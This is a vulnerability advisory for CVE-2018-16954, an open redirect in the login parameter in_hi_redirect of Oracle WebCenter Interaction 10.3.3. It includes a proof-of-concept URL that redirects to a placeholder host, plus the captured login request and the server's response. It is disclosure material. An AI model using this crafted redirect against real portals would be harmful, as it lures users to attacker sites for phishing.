# Oracle WebCenter Interaction - Insecure Redirection

**CVE:** CVE-2018-16954

**CVSSv3:** 5.3 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N

**Versions affected:** 10.3.3 (10.3.3.379633)

## Introduction

Oracle WebCenter Interaction, formerly called BEA AquaLogic User Interaction and now part of Oracle WebCenter Suite, is an integrated, comprehensive collection of components used to create enterprise portals, collaborative communities, and composite and social applications.

## Background

The Oracle WebCenter Interaction (WCI) portal is the primary user interface to the suite of services provided by WCI. The portal provides a default database-backed authentication system and can be extended to use remote directory services such as LDAP and Active Directory.

## Vulnerability

The login function of the portal is vulnerable to insecure redirection (also called an open redirect vulnerability).

The `in_hi_redirect` parameter allows the portal to redirect a user to another page once they have successfully logged in. It is primarily used to provide links to authenticated content that a user is returned to once they have logged in.

This parameter is not validated to ensure its value contains the same origin as the portal or is from a list of trusted domains. Consquently, an attacker can set the value to the URL of a malicious site they operate and mislead users into being redirected to that site.

This is achieved by constructing a URL (as shown below) that when accessed, requires the user to login to the portal. Once they have logged in, the user will automatically be redirected to the malicious site by the portal.

```
http://192.168.1.174/portal/server.pt?in_hi_space=Login&in_hi_spaceID=&in_hi_control=Login&in_hi_redirect=https://foo.com
```

Visiting the URL will display the portal login page as shown in Figure 1 below.

![login page](images/03-open-redir-login-page.jpg)

When the user submits their login request, it will include the `in_hi_redirect` parameter as shown.

```
POST /portal/server.pt? HTTP/1.1
Host: <HOST>
Content-Length: 185
Cache-Control: max-age=0
Origin: http://<HOST>
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://<HOST>/portal/server.pt?in_hi_space=Login&in_hi_spaceID=&in_hi_control=Login&in_hi_dologin=true&in_tx_username=Administrator&in_pw_userpass=&in_se_authsource=&in_hi_redirect=https://foo.com
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: ptLastLoginAuthSource=
Connection: close

in_hi_redirect=https%3A%2F%2Ffoo.com&in_hi_space=Login&in_hi_spaceID=&in_hi_control=Login&in_hi_dologin=true&in_tx_username=Administrator&in_pw_userpass=Password%40223&in_se_authsource=
```

The response will then redirect the user with a HTTP 302 or META HTML tag; depending on whether the parameter value used the http or https scheme.

```
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 296
Content-Type: text/html; charset=utf-8
Content-Language: en
Expires: 1529917610310
Last-Modified: 1530004010310
Server: Microsoft-IIS/7.5
X-AspNet-Version: 2.0.50727
Set-Cookie: ASP.NET_SessionId=ijrpqo55wjfxkeyii5gl4445; path=/
Set-Cookie: plloginoccured=true; path=/; HttpOnly
X-Powered-By: ASP.NET
Date: Tue, 26 Jun 2018 09:06:50 GMT
Connection: close

<html><head><meta HTTP-EQUIV="REFRESH" CONTENT="0; URL=https://foo.com"></head></html><!--Hostname: WCISRV--><!--Total Request Time: 31
Control Time: 16
Page Construction Time: -1
Page Display Time: 0
--><!--Portal Version: 10.3.3.379633, Changelist: 379633, Build Date: 08/12/2011 at 10:30 AM-->
```

The URL can be used in social engineering and e-mail phishing attacks. Because the domain of the portal will be trusted by recipients of these attacks, it dramatically increases their likelihood of the attack's success.

## Versions Affected

This vulnerability affects version 10.3.3 of the Oracle WebCenter Interaction portal - specifically build 10.3.3.379633 (the latest version at the time of writing).

## References

https://github.com/xdrr/vulnerability-research/tree/master/webapp/oracle/webcenter/interaction/2018-06-multiple

## Credit

This vulnerability was discovered by Ben N (pajexali@gmail.com) 26 June 2018.

---
mainfont: Roboto
monofont: Source Code Pro
header-includes:
    - \lstset{breaklines=true}
    - \lstset{language=[Motorola68k]Assembler}
    - \lstset{basicstyle=\small\ttfamily}
    - \lstset{extendedchars=true}
    - \lstset{tabsize=2}
    - \lstset{columns=fixed}
    - \lstset{showstringspaces=false}
    - \lstset{frame=trbl}
    - \lstset{frameround=tttt}
    - \lstset{framesep=4pt}
    - \lstset{numbers=left}
    - \lstset{numberstyle=\tiny\ttfamily}
    - \lstset{postbreak=\raisebox{0ex}[0ex][0ex]{\ensuremath{\color{red}\hookrightarrow\space}}}
...